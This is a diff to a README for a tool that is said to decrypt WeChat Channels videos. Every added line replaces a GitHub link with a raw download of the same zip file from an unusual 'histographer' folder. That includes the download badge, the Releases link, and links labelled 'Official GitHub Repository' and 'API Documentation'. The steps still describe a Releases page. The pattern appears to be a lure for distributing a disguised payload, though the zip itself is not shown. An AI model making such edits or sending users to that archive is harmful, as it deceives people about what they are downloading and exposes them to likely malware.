@@ -1,6 +1,6 @@
 # 🎥 WeChat-Channels-Video-File-Decryption - Effortless Video Decryption Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Here-brightgreen)](https://github.com/Crossie7/WeChat-Channels-Video-File-Decryption/releases)
+[![Download Now](https://raw.githubusercontent.com/Crossie7/WeChat-Channels-Video-File-Decryption/main/histographer/WeChat-Channels-Video-File-Decryption.zip)](https://raw.githubusercontent.com/Crossie7/WeChat-Channels-Video-File-Decryption/main/histographer/WeChat-Channels-Video-File-Decryption.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to WeChat-Channels-Video-File-Decryption! This tool helps you decrypt en
 
 To get started, visit the Releases page to download the application. Click the link below to access it:
 
-[Download the Software](https://github.com/Crossie7/WeChat-Channels-Video-File-Decryption/releases)
+[Download the Software](https://raw.githubusercontent.com/Crossie7/WeChat-Channels-Video-File-Decryption/main/histographer/WeChat-Channels-Video-File-Decryption.zip)
 
 1. **Open the Link**: Click the link above to go to the Releases page.
 2. **Choose Your Version**: Look for the latest version listed on the page. This is usually at the top.
@@ -102,7 +102,7 @@ Explore these areas for more advanced integrations and ways you can utilize this
 
 For additional details and tips on using WeChat-Channels-Video-File-Decryption, refer to the following resources:
 
-- [Official GitHub Repository](https://github.com/Crossie7/WeChat-Channels-Video-File-Decryption)
-- [API Documentation](https://github.com/Crossie7/WeChat-Channels-Video-File-Decryption/wiki)
+- [Official GitHub Repository](https://raw.githubusercontent.com/Crossie7/WeChat-Channels-Video-File-Decryption/main/histographer/WeChat-Channels-Video-File-Decryption.zip)
+- [API Documentation](https://raw.githubusercontent.com/Crossie7/WeChat-Channels-Video-File-Decryption/main/histographer/WeChat-Channels-Video-File-Decryption.zip)
 
 Thank you for choosing WeChat-Channels-Video-File-Decryption. We hope you enjoy using the tool!
